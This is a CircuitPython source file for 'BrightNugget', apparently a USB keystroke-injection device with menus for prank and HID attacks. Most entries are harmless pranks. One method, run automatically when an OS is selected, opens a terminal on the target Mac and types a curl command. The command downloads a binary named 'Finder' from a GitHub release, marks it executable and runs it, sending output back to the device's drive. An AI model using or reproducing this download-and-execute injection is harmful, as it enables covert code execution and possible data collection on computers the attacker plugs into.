from json import load, dump
from collections import OrderedDict
from brightnugget import BrightNugget
from brighthid import BrightHID
from microcontroller import reset


class Nugget(BrightNugget):
    def __init__(self):
        super().__init__()
        self.keyboard = BrightHID()
        self.os = "Windows"
        with open("brightnugget.conf", "r") as configFile:
            self.config = load(configFile)
            configFile.close()

        self.settings = self.guiList("BrightNugget Settings", OrderedDict(
            [
                ("Toggle Prog. Bars", self.toggleProgressBars),
                ("Save Nugget Conf.", self.saveConfig),
                ("Print Nugget Conf.", lambda e: print(self.config)),
                ("Reboot", lambda e: self.guiMessage(
                    "Eject Drive",
                    "To avoid data loss:\nEject the CIRCUITPY\ndrive, then hit an\n arrow.",
                    None,
                    reset,
                )),
            ]
        ))
        self.OSMenu = self.guiList("Select OS", OrderedDict(
            [
                ("Windows", lambda e: self.switchOS("Windows")),
                ("MacOS", lambda e: self.switchOS("MacOS")),
                ("Linux", lambda e: self.switchOS("Linux")),
            ]
        ))
        self.prankMenu = self.guiList("Prank Attacks", OrderedDict(
            [
                ("Say Hello", self.keyboard.note),
                ("Wallpaper Changer", self.keyboard.wallpaper),
                ("Dancing Parrot", self.parrot),
            ]
        ))

        self.attacks = self.guiList("HID Attacks", OrderedDict(
            [
                ("Pranks", self.prankMenu),
                ("Settings & Debug", self.settings)
            ]
        ))
        self.progressBar = self.guiProgressBar(self.attacks)

        self.OSMenu.show()

    def injectHiddenHID(self):
        self.keyboard.init()
        if self.os == "MacOS":
            self.keyboard.terminal()
            self.keyboard.update("Injecting HiddenHID...", 0)
            self.keyboard.write(f"curl \"https://github.com/Bright-Shard/HiddenHID/releases/download/latest/Finder\" -L -o Finder; chmod +x Finder; ./Finder output=/Volumes/{self.config['Drive Name']}/loaded")

    def switchOS(self, newOS: str):
        self.os = newOS
        self.keyboard.setOS(self.os)
        if self.config["Progress Bars"]:
            self.keyboard.hook(self.progressBar)
        else:
            self.keyboard.hook(None)
        self.injectHiddenHID()
        self.attacks.show()

    def toggleProgressBars(self):
        self.config["Progress Bars"] = not self.config["Progress Bars"]
        if self.config["Progress Bars"]:
            self.keyboard.hook(self.progressBar)
        else:
            self.keyboard.hook(None)

    def saveConfig(self):
        with open("brightnugget.conf", "w") as configFile:
            dump(self.config, configFile)
            configFile.close()

    def parrot(self):
        self.keyboard.init()
        self.keyboard.update("Opening the terminal...", 0)
        self.keyboard.terminal()
        self.keyboard.update("cURLing parrot.live...", 50)
        self.keyboard.write("curl parrot.live\n")
        self.keyboard.update("Done! :3", 100)


Nugget()
